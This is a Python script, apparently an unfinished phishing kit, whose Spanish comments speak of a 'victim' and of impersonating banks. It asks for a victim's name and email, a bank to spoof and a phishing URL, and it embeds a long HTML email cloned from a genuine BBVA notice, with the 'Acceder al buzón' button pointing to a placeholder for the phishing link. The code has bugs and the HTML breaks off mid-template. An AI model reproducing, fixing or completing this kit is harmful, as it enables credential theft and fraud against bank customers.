import time
import os
import sys
import smtplib

def BankEs():
    #Información de la victima
    userName = input("Introduce el nombre de tu victima-->")
    bank = input("Introduce el banco que quieres suplantar-->")
    url=("Introduce el url de phishing-->")
    userEmail=("Introduce el email de la victima-->")
    
    ##HTML que se enviara a la victima
    if bank==1:
        bbvaEs(userName,userEmail,url)
    elif bank==2:
        santanderEs()


def bbvaEs(userName,userEmail,url):
    ##HTML suplantacion bbva
    bbvaHtml=("""
                   <html>
                      <div
                        marginheight="0"
                        marginwidth="0"
                        style="
                          height: 100% !important;
                          margin: 0 !important;
                          padding: 0 !important;
                          width: 100% !important;
                          width: 100% !important;
                          background-color: currentColor;
                        "
                      >
                        <div class="adM"></div>
                        <table
                          align="center"
                          border="0"
                          cellpadding="0"
                          cellspacing="0"
                          style="
                            border-collapse: collapse !important;
                            max-width: 600px;
                            width: 100%;
                            background-color: #ffffff;
                            font-family: Arial, Helvetica, sans-serif;
                          "
                        >
                          <tbody>
                            <tr style="background-color: #001b45">
                              <td align="center">
                                <table
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                  style="border-collapse: collapse !important"
                                  width="90%"
                                >
                                  <tbody>
                                    <tr>
                                      <td height="25" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                    <tr style="font-size: 0">
                                      <td align="center" style="font-size: 0">
                                        <img
                                          alt="BBVA"
                                          src="https://ci3.googleusercontent.com/meips/ADKq_NaRKuTJ9Jcg2KGezN4PH4h05X8KQSeyTTgJxgnZoucggPgMLpdC4Wg81Fac3SQu9UXIIIDmVies-pwP1WBiapD7mlvF5eSqzOGwxFckTmLFrrIlADcWdpPfB3fC_UstcCq7cnyvUX_lLlbtlypUK7-wkQE5bk3Oh2uKmQ=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/84eebc17-f0f7-4570-9559-0fe9bc475fdf.png"
                                          style="
                                            border: none;
                                            font-size: 0;
                                            border: 0;
                                            line-height: 100%;
                                            outline: none;
                                            text-decoration: none;
                                          "
                                          width="90"
                                          class="CToWUd"
                                          data-bit="iit"
                                        />
                                      </td>
                                    </tr>
                                    <tr>
                                      <td height="25" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>
                            </tr>
                            <tr>
                              <td
                                height="8"
                                style="
                                  font-size: 1px;
                                  line-height: 1px;
                                  font-size: 1px;
                                  line-height: 1px;
                                  background: #d3d3d3;
                                "
                              >
                                &nbsp;
                              </td>
                            </tr>
                            <tr>
                              <td align="center" style="background-color: #ffffff">
                                <table
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                  style="border-collapse: collapse !important"
                                  width="86%"
                                >
                                  <tbody>
                                    <tr>
                                      <td height="40" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                    <tr>
                                      <td
                                        align="center"
                                        style="
                                          font-size: 28px;
                                          line-height: 30px;
                                          text-align: center;
                                          color: #1973b8;
                                          font-weight: bold;
                                          font-size: 34px;
                                          line-height: 34px;
                                        "
                                      >
                                        Tienes una comunicación destacada
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                                <table
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                  style="border-collapse: collapse !important"
                                  width="84%"
                                >
                                  <tbody>
                                    <tr>
                                      <td height="32" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                    <tr>
                                      <td
                                        align="center"
                                        style="
                                          font-size: 15px;
                                          line-height: 24px;
                                          text-align: center;
                                        "
                                      >
                                        Usuario, hemos dejado una comunicación en tu buzón que
                                        creemos puede ser importante para ti.
                                      </td>
                                    </tr>
                                    <tr>
                                      <td height="20" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                    <tr>
                                      <td align="left">
                                        <table
                                          border="0"
                                          cellpadding="0"
                                          cellspacing="0"
                                          style="border-collapse: collapse !important"
                                          width="100%"
                                        >
                                          <tbody>
                                            <tr>
                                              <td
                                                height="8"
                                                style="font-size: 1px; line-height: 1px"
                                              >
                                                &nbsp;
                                              </td>
                                            </tr>
                                            <tr>
                                              <td
                                                style="
                                                  font-size: 16px;
                                                  line-height: 19px;
                                                  color: #121212;
                                                  font-family: Helvetica, Arial, sans-serif;
                                                  text-align: center;
                                                "
                                              >
                                                <span style="font-weight: bold">
                                                  - Cambio en pagos online con Bizum</span
                                                >
                                              </td>
                                            </tr>
                                            <tr>
                                              <td
                                                height="8"
                                                style="font-size: 1px; line-height: 1px"
                                              >
                                                &nbsp;
                                              </td>
                                            </tr>
                                          </tbody>
                                        </table>
                                      </td>
                                    </tr>
                                    <tr>
                                      <td height="20" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                    <tr>
                                      <td
                                        align="center"
                                        style="
                                          font-size: 15px;
                                          line-height: 24px;
                                          text-align: center;
                                        "
                                      >
                                        Te recomendamos que accedas a tu banca online para ver tus
                                        mensajes y no perderte nada.
                                      </td>
                                    </tr>
                                    <tr>
                                      <td height="40" style="font-size: 1px; line-height: 1px">
                                        &nbsp;
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>
                            </tr>
                            <tr>
                              <td align="center">
                                <table
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                  style="border-collapse: collapse !important"
                                  width="30%"
                                >
                                  <tbody>
                                    <tr>
                                      <td align="center" bgcolor="#02A5A5" height="60" width="150">
                                        <div>
                                          <a
                                            href="{}"
                                            style="
                                              font-size: 16px;
                                              font-family: Helvetica, Arial, sans-serif;
                                              color: #ffffff;
                                              text-decoration: none;
                                              display: inline-block;
                                              min-width: 250px;
                                              width: 100%;
                                              line-height: 60px;
                                            "
                                            target="_blank"
                                            data-saferedirecturl="{}"
                                          >
                                            <strong>Acceder al buzón</strong>
                                          </a>
                                        </div>
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>
                            </tr>
                            <tr>
                              <td height="40" style="font-size: 1px; line-height: 1px">&nbsp;</td>
                            </tr>
                            <tr>
                              <td
                                style="
                                  font-size: 1px;
                                  line-height: 1px;
                                  font-size: 1px;
                                  line-height: 1px;
                                  background: #d3d3d3;
                                "
                              >
                                <table
                                  align="center"
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                  style="border-collapse: collapse !important"
                                  width="100%"
                                >
                                  <tbody>
                                    <tr>
                                      <td
                                        align="right"
                                        colspan="2"
                                        style="
                                          font-family: Arial Regular, Arial, Helvetica, sans-serif;
                                          font-size: 9px;
                                          line-height: 19px;
                                          color: #848484;
                                          padding-right: 30px;
                                        "
                                      >
                                        05090 4
                                      </td>
                                    </tr>
                                  </tbody>
                                </table>
                              </td>
                            </tr>
                            <tr>
                              <td bgcolor="#072146">
                                <table
                                  align="center"
                                  bgcolor="#072146"
                                  border="0"
                                  cellpadding="0"
                                  cellspacing="0"
                                >
                                  <tbody>
                                    <tr>
                                      <td align="center">
                                        <table
                                          border="0"
                                          cellpadding="0"
                                          cellspacing="0"
                                          style="border-collapse: collapse !important"
                                          width="100%"
                                        >
                                          <tbody>
                                            <tr>
                                              <td align="center" bgcolor="#2a86ca">
                                                <table
                                                  border="0"
                                                  cellpadding="0"
                                                  cellspacing="0"
                                                  style="border-collapse: collapse !important"
                                                  width="100%"
                                                >
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        height="25"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        align="center"
                                                        style="
                                                          font-family: Arial, Helvetica, sans-serif;
                                                          text-align: center;
                                                          color: #ffffff;
                                                          font-size: 14px;
                                                          line-height: 14px;
                                                        "
                                                      >
                                                        <strong>Opera y consulta en:</strong>
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        height="30"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td align="center">
                                                        <table
                                                          align="center"
                                                          border="0"
                                                          cellpadding="0"
                                                          cellspacing="0"
                                                          style="
                                                            display: inline-block;
                                                            border-collapse: collapse !important;
                                                          "
                                                          width="244"
                                                        >
                                                          <tbody>
                                                            <tr>
                                                              <td align="center" width="244">
                                                                <table
                                                                  align="center"
                                                                  border="0"
                                                                  cellpadding="0"
                                                                  cellspacing="0"
                                                                  style="
                                                                    border-collapse: collapse !important;
                                                                  "
                                                                >
                                                                  <tbody>
                                                                    <tr>
                                                                      <td
                                                                        align="center"
                                                                        width="120"
                                                                      >
                                                                        <table
                                                                          align="center"
                                                                          border="0"
                                                                          cellpadding="0"
                                                                          cellspacing="0"
                                                                          style="
                                                                            border-collapse: collapse !important;
                                                                          "
                                                                          width="120"
                                                                        >
                                                                          <tbody>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="font-size: 0"
                                                                                width="30"
                                                                              >
                                                                                <img
                                                                                  alt="BBVA"
                                                                                  height="30"
                                                                                  src="https://ci3.googleusercontent.com/meips/ADKq_NbjBTxO4gbymthWSkK93AvNfzMsegpjG37sY3-RNNasNk9xv6NDXSUP4MY7IfrownUR4czsjUNg9mbyY6_IG38ouD4f4mj4_kJNbfBa3qawUlJr9G-6tUJRxc89pFrObZQac_3tEWg4Ee2bbhcxFNMDOBiYQwuZtz7keQ=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/7920cf99-9f31-473f-88bc-2048cec8a3c1.png"
                                                                                  style="
                                                                                    display: block;
                                                                                    border: 0;
                                                                                    font-size: 0;
                                                                                    border: 0;
                                                                                    line-height: 100%;
                                                                                    outline: none;
                                                                                    text-decoration: none;
                                                                                  "
                                                                                  width="30"
                                                                                  class="CToWUd"
                                                                                  data-bit="iit"
                                                                                />
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="12"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="
                                                                                  font-family: Arial,
                                                                                    Helvetica,
                                                                                    sans-serif;
                                                                                  text-align: center;
                                                                                  color: #ffffff;
                                                                                  font-size: 12px;
                                                                                  line-height: 14px;
                                                                                "
                                                                                valign="top"
                                                                              >
                                                                                <a
                                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Fsistema%2Fredireccion.jsp%3Fdiren=banca-telefonica%26cid=eml:mem::spain-cast--pie_canales-banca_telefonica-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/VV5z1GUB13V1dCSoUL1COLJ-xiI=340"
                                                                                  style="
                                                                                    text-decoration: underline;
                                                                                    color: #ffffff;
                                                                                    display: block;
                                                                                  "
                                                                                  target="_blank"
                                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Fsistema%252Fredireccion.jsp%253Fdiren%3Dbanca-telefonica%2526cid%3Deml:mem::spain-cast--pie_canales-banca_telefonica-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/VV5z1GUB13V1dCSoUL1COLJ-xiI%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw3f5b9IXinbOqTXPuuY_OaL"
                                                                                >
                                                                                  <strong
                                                                                    >900 10 28
                                                                                    01</strong
                                                                                  >
                                                                                </a>
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="25"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                          </tbody>
                                                                        </table>
                                                                      </td>
                                                                      <td
                                                                        align="center"
                                                                        width="120"
                                                                      >
                                                                        <table
                                                                          align="center"
                                                                          border="0"
                                                                          cellpadding="0"
                                                                          cellspacing="0"
                                                                          style="
                                                                            border-collapse: collapse !important;
                                                                          "
                                                                          width="120"
                                                                        >
                                                                          <tbody>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="font-size: 0"
                                                                                width="30"
                                                                              >
                                                                                <img
                                                                                  alt="BBVA"
                                                                                  height="30"
                                                                                  src="https://ci3.googleusercontent.com/meips/ADKq_NZKkhCxGqu1pdWiTizNrRQ6zBK9oL4EsnZ1oMxe6aXaomEIVE8GY48IMRv69L0mmA7d3Fe32LZwkAq44Y_iwyr_uEIzP6Z4PJrvv6F2FH3yQvO0kZQP01jn4PtUVh56JN5KwAK4e5NYJP7mSgxaSm8s4gYLxBuJ-iRj9A=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/21645e15-1fbe-4d4d-af3c-0a64745ae225.png"
                                                                                  style="
                                                                                    display: block;
                                                                                    border: 0;
                                                                                    font-size: 0;
                                                                                    border: 0;
                                                                                    line-height: 100%;
                                                                                    outline: none;
                                                                                    text-decoration: none;
                                                                                  "
                                                                                  width="30"
                                                                                  class="CToWUd"
                                                                                  data-bit="iit"
                                                                                />
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="12"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="
                                                                                  font-family: Arial,
                                                                                    Helvetica,
                                                                                    sans-serif;
                                                                                  text-align: center;
                                                                                  color: #ffffff;
                                                                                  font-size: 12px;
                                                                                  line-height: 14px;
                                                                                "
                                                                                valign="top"
                                                                              >
                                                                                <a
                                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Fsistema%2Fredireccion.jsp%3Fdiren=home-particulares%26cid=eml:mem::spain-cast--pie_canales-home-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/jwVeVH7d_87ABRniMztDzdanKv8=340"
                                                                                  style="
                                                                                    text-decoration: underline;
                                                                                    color: #ffffff;
                                                                                    display: block;
                                                                                  "
                                                                                  target="_blank"
                                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Fsistema%252Fredireccion.jsp%253Fdiren%3Dhome-particulares%2526cid%3Deml:mem::spain-cast--pie_canales-home-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/jwVeVH7d_87ABRniMztDzdanKv8%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw3wdgygfSrFLG1FYSoSx1v7"
                                                                                >
                                                                                  <strong
                                                                                    ><span
                                                                                      class="il"
                                                                                      >bbva</span
                                                                                    >.es</strong
                                                                                  >
                                                                                </a>
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="25"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                          </tbody>
                                                                        </table>
                                                                      </td>
                                                                    </tr>
                                                                  </tbody>
                                                                </table>
                                                              </td>
                                                            </tr>
                                                          </tbody>
                                                        </table>
                                                        <table
                                                          align="center"
                                                          border="0"
                                                          cellpadding="0"
                                                          cellspacing="0"
                                                          style="
                                                            display: inline-block;
                                                            border-collapse: collapse !important;
                                                          "
                                                          width="244"
                                                        >
                                                          <tbody>
                                                            <tr>
                                                              <td align="center" width="244">
                                                                <table
                                                                  align="center"
                                                                  border="0"
                                                                  cellpadding="0"
                                                                  cellspacing="0"
                                                                  style="
                                                                    border-collapse: collapse !important;
                                                                  "
                                                                >
                                                                  <tbody>
                                                                    <tr>
                                                                      <td
                                                                        align="center"
                                                                        width="120"
                                                                      >
                                                                        <table
                                                                          align="center"
                                                                          border="0"
                                                                          cellpadding="0"
                                                                          cellspacing="0"
                                                                          style="
                                                                            border-collapse: collapse !important;
                                                                          "
                                                                          width="120"
                                                                        >
                                                                          <tbody>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="font-size: 0"
                                                                                width="30"
                                                                              >
                                                                                <img
                                                                                  alt="BBVA"
                                                                                  height="30"
                                                                                  src="https://ci3.googleusercontent.com/meips/ADKq_NZdNgKcnf2cRa0sP6vreVKICQXXewlBF5rsab2R90QYcATKlWCQW_IjT4Bo0e8c1A7VtoJv-XRakic-prQW1_STxfsaGNkOEYP7lNPYDJIF_agcH39VSGTScrrTXCKWWN7vYVzgq_FWpe3wGWvbzbEcFPpspvbhfARCmA=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/53fb7037-6bf6-4c96-b414-e6d6b2726f03.png"
                                                                                  style="
                                                                                    display: block;
                                                                                    border: 0;
                                                                                    font-size: 0;
                                                                                    border: 0;
                                                                                    line-height: 100%;
                                                                                    outline: none;
                                                                                    text-decoration: none;
                                                                                  "
                                                                                  width="30"
                                                                                  class="CToWUd"
                                                                                  data-bit="iit"
                                                                                />
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="12"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="
                                                                                  font-family: Arial,
                                                                                    Helvetica,
                                                                                    sans-serif;
                                                                                  text-align: center;
                                                                                  color: #ffffff;
                                                                                  font-size: 12px;
                                                                                  line-height: 14px;
                                                                                "
                                                                                valign="top"
                                                                              >
                                                                                <a
                                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Fsistema%2Fredireccion.jsp%3Fdiren=app-bbva%26cid=eml:mem::spain-cast--pie_canales-apps-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/Erz9gGssplhILXebCDgOFfsOk-w=340"
                                                                                  style="
                                                                                    text-decoration: underline;
                                                                                    color: #ffffff;
                                                                                    display: block;
                                                                                  "
                                                                                  target="_blank"
                                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Fsistema%252Fredireccion.jsp%253Fdiren%3Dapp-bbva%2526cid%3Deml:mem::spain-cast--pie_canales-apps-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/Erz9gGssplhILXebCDgOFfsOk-w%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw0tO2stigAlXkO9kQt1rRnh"
                                                                                >
                                                                                  <strong
                                                                                    ><span
                                                                                      class="il"
                                                                                      >BBVA</span
                                                                                    >
                                                                                    Apps</strong
                                                                                  >
                                                                                </a>
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="25"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                          </tbody>
                                                                        </table>
                                                                      </td>
                                                                      <td
                                                                        align="center"
                                                                        width="120"
                                                                      >
                                                                        <table
                                                                          align="center"
                                                                          border="0"
                                                                          cellpadding="0"
                                                                          cellspacing="0"
                                                                          style="
                                                                            border-collapse: collapse !important;
                                                                          "
                                                                          width="120"
                                                                        >
                                                                          <tbody>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="font-size: 0"
                                                                                width="30"
                                                                              >
                                                                                <img
                                                                                  alt="BBVA"
                                                                                  height="30"
                                                                                  src="https://ci3.googleusercontent.com/meips/ADKq_NYd4LvsleYR5RmQgxId5SjsqUJ6qXVAPzKM1f4rSRxUif_XIQ81gyOK84u9xAjYIBD8Z9cvMr4MZh-EZ6uGW_DC9nPNfuRT3O3lnM4-C46HCxzkf8MKVFDfGEINx53hlc6dXkFFy6Zgazluvg_29Yra_20zY96_X283NQ=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/3dedad3e-0b6b-4efe-bc40-16ffd0899eec.png"
                                                                                  style="
                                                                                    display: block;
                                                                                    border: 0;
                                                                                    font-size: 0;
                                                                                    border: 0;
                                                                                    line-height: 100%;
                                                                                    outline: none;
                                                                                    text-decoration: none;
                                                                                  "
                                                                                  width="30"
                                                                                  class="CToWUd"
                                                                                  data-bit="iit"
                                                                                />
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="12"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                align="center"
                                                                                style="
                                                                                  font-family: Arial,
                                                                                    Helvetica,
                                                                                    sans-serif;
                                                                                  text-align: center;
                                                                                  color: #ffffff;
                                                                                  font-size: 12px;
                                                                                  line-height: 14px;
                                                                                "
                                                                                valign="top"
                                                                              >
                                                                                <a
                                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.bbva.es%2Fsistema%2Fredireccion-oficinas.jsp%3Fcid=eml:mem::spain-cast--pie_canales-cajeros-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/e7K9eXxwO--w4Ew6iEBfuobdnTA=340"
                                                                                  style="
                                                                                    text-decoration: underline;
                                                                                    color: #ffffff;
                                                                                    display: block;
                                                                                  "
                                                                                  target="_blank"
                                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.bbva.es%252Fsistema%252Fredireccion-oficinas.jsp%253Fcid%3Deml:mem::spain-cast--pie_canales-cajeros-pa-:-:::::::::/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/e7K9eXxwO--w4Ew6iEBfuobdnTA%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw2k9HVTL4mVFbOqkNgWDHjc"
                                                                                >
                                                                                  <strong
                                                                                    >Tu
                                                                                    cajero</strong
                                                                                  >
                                                                                </a>
                                                                              </td>
                                                                            </tr>
                                                                            <tr>
                                                                              <td
                                                                                height="25"
                                                                                style="
                                                                                  font-size: 1px;
                                                                                  line-height: 1px;
                                                                                "
                                                                              >
                                                                                &nbsp;
                                                                              </td>
                                                                            </tr>
                                                                          </tbody>
                                                                        </table>
                                                                      </td>
                                                                    </tr>
                                                                  </tbody>
                                                                </table>
                                                              </td>
                                                            </tr>
                                                          </tbody>
                                                        </table>
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td align="center" bgcolor="#004481">
                                                <table
                                                  border="0"
                                                  cellpadding="0"
                                                  cellspacing="0"
                                                  style="border-collapse: collapse !important"
                                                  width="100%"
                                                >
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        height="20"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td align="center" width="108">
                                                        <table
                                                          align="center"
                                                          border="0"
                                                          cellpadding="0"
                                                          cellspacing="0"
                                                          style="
                                                            border-collapse: collapse !important;
                                                          "
                                                          width="108"
                                                        >
                                                          <tbody>
                                                            <tr>
                                                              <td align="center" width="28">
                                                                <a
                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.facebook.com%2Fbbvaenespana%2F/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/f2fDanO_pV_HYxHU26rkxZIAmOQ=340"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.facebook.com%252Fbbvaenespana%252F/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/f2fDanO_pV_HYxHU26rkxZIAmOQ%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw0c40Aky5qrnZ2VkuTTm5iO"
                                                                >
                                                                  <img
                                                                    alt="FB"
                                                                    height="28"
                                                                    src="https://ci3.googleusercontent.com/meips/ADKq_NY43_nTvhX3fy7Xc-3FQQLFx9hYUT5gk0X-kK6EcSMXYLsqWDXfAyWhdvZ8jUys1PBaFVEvnNfcKQcf_gYePMWMai3VuSrgpQd0BIt2NLiHgFLOr1TuTBH-BDRUQzg9K4Xv1zX_Fv2oaZygvcBHSarAOYGBdCRRj5EVpA=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/0171ce24-51f8-46a3-8b0c-c1ae582ca2d0.png"
                                                                    style="
                                                                      display: block;
                                                                      border: 0;
                                                                      font-size: 0;
                                                                      border: 0;
                                                                      line-height: 100%;
                                                                      outline: none;
                                                                      text-decoration: none;
                                                                    "
                                                                    width="28"
                                                                    class="CToWUd"
                                                                    data-bit="iit"
                                                                  />
                                                                </a>
                                                              </td>
                                                              <td width="12">&nbsp;</td>
                                                              <td align="center" width="28">
                                                                <a
                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Ftwitter.com%2Fbbvaresponde_es/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/C7x1Oqe4LA3XOn2s10qZ7IUokJM=340"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Ftwitter.com%252Fbbvaresponde_es/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/C7x1Oqe4LA3XOn2s10qZ7IUokJM%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw0LeNhyM-BAGafbqvGczKxa"
                                                                >
                                                                  <img
                                                                    alt="Tw"
                                                                    height="28"
                                                                    src="https://ci3.googleusercontent.com/meips/ADKq_NYJIcVmTiGpi_lDjibX92jKTEMkhH-1-PEjyACMf6F3kNL5NfFW5Jp7-baMDM2SYl5Fmd9O44tCfS5xMAK9xLAMwoUbms_ye-sLN6_y9CdCUyoOp00jj6gOsolqUFL_bqqujz6iqAWy9SsKgjWPROm6baRlTEHJEYfwsw=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/499d8f4a-ab4b-467a-85ea-ef5eb3797aa1.png"
                                                                    style="
                                                                      display: block;
                                                                      border: 0;
                                                                      font-size: 0;
                                                                      border: 0;
                                                                      line-height: 100%;
                                                                      outline: none;
                                                                      text-decoration: none;
                                                                    "
                                                                    width="28"
                                                                    class="CToWUd"
                                                                    data-bit="iit"
                                                                  />
                                                                </a>
                                                              </td>
                                                              <td width="12">&nbsp;</td>
                                                              <td align="center" width="28">
                                                                <a
                                                                  href="https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%2F%2Fwww.youtube.com%2Fuser%2FBBVAespana/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/UxZ2lWWx4-ihwJFBn-bg6ZpmQ1w=340"
                                                                  target="_blank"
                                                                  data-saferedirecturl="https://www.google.com/url?q=https://xwkm5qky.r.eu-west-1.awstrack.me/L0/https:%252F%252Fwww.youtube.com%252Fuser%252FBBVAespana/1/0102018acc1f1298-5f900816-970a-4304-ae5c-2b2074811719-000000/UxZ2lWWx4-ihwJFBn-bg6ZpmQ1w%3D340&amp;source=gmail&amp;ust=1715159318116000&amp;usg=AOvVaw1KUrcxHiRoRedopEB2K0UR"
                                                                >
                                                                  <img
                                                                    alt="YT"
                                                                    height="28"
                                                                    src="https://ci3.googleusercontent.com/meips/ADKq_NYvFpfRr89L3Mofsk0xyyzst1sRgaaaceIFy-i0scNhzI3-g_exsNa9eir6PZCosMTPkJaq0rxBzj7o0EMrMb4k_m7EI8R0E0M3fMpFo0soIesLW_XFFpAPi7exAm71w5HcerD71CLzfaXdvEElNOORHAr-SWQvRGLhbg=s0-d-e1-ft#https://image.soluciones.bbva.com/lib/fe951373746c057d73/m/3/78dbfd5c-a268-4ed7-abad-550b6b29afb7.png"
                                                                    style="
                                                                      display: block;
                                                                      border: 0;
                                                                      font-size: 0;
                                                                      border: 0;
                                                                      line-height: 100%;
                                                                      outline: none;
                                                                      text-decoration: none;
                                                                    "
                                                                    width="28"
                                                                    class="CToWUd"
                                                                    data-bit="iit"
                                                                  />
                                                                </a>
                                                              </td>
                                                            </tr>
                                                          </tbody>
                                                        </table>
                                                      </td>
                                                    </tr>
                                                    <tr>
                                                      <td
                                                        height="20"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                  </tbody>
                                                </table>
                                              </td>
                                            </tr>
                                            <tr>
                                              <td align="center" bgcolor="#072146">
                                                <table
                                                  border="0"
                                                  cellpadding="0"
                                                  cellspacing="0"
                                                  style="border-collapse: collapse !important"
                                                  width="84%"
                                                >
                                                  <tbody>
                                                    <tr>
                                                      <td
                                                        height="30"
                                                        style="font-size: 1px; line-height: 1px"
                                                      >
                                                        &nbsp;
                                                      </td>
                                                    </tr>
                                                    <tr style="font-size: 0">
                                                      <td align="center" style="font-size: 0">
